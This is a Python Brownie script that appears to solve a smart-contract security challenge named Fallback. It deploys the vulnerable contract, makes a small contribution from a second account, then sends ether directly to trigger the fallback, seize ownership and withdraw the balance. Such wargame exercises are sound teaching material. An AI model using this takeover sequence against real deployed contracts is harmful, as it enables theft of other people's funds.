from scripts.helpers import get_account
from web3 import Web3
from brownie import Fallback


def deploy_fallback(account):
    print("Deploying contract..")
    fallback_deployment = Fallback.deploy({"from": account})
    return fallback_deployment


def claim_ownership_of_fallback(fallback_contract, claiming_account):
    print("Contributing to the fallback contract..")
    tx_contribution = fallback_contract.contribute({"from": claiming_account, "value": Web3.toWei("0.0005", "ether")})
    tx_contribution.wait(1)
    print("Sending ether to the fallback contract..")
    tx_transfer = claiming_account.transfer(fallback_contract.address, "1 ether")
    tx_transfer.wait(1)


def withdraw_fallback_contract(fallback_contract, claiming_account):
    print("Withdrawing fallback contract")
    tx_withdraw = fallback_contract.withdraw({"from": claiming_account})
    tx_withdraw.wait(1)


def main():
    # Set accounts
    account_to_break = get_account(0)
    account_to_deploy = get_account(1)
    # Deploy Fallback contract
    fallback_contract = deploy_fallback(account_to_deploy)
    # Claim ownership of fallback contract by diff account
    claim_ownership_of_fallback(fallback_contract, account_to_break)
    # Withdraw ethers from fallback contract by diff account
    withdraw_fallback_contract(fallback_contract, account_to_break)


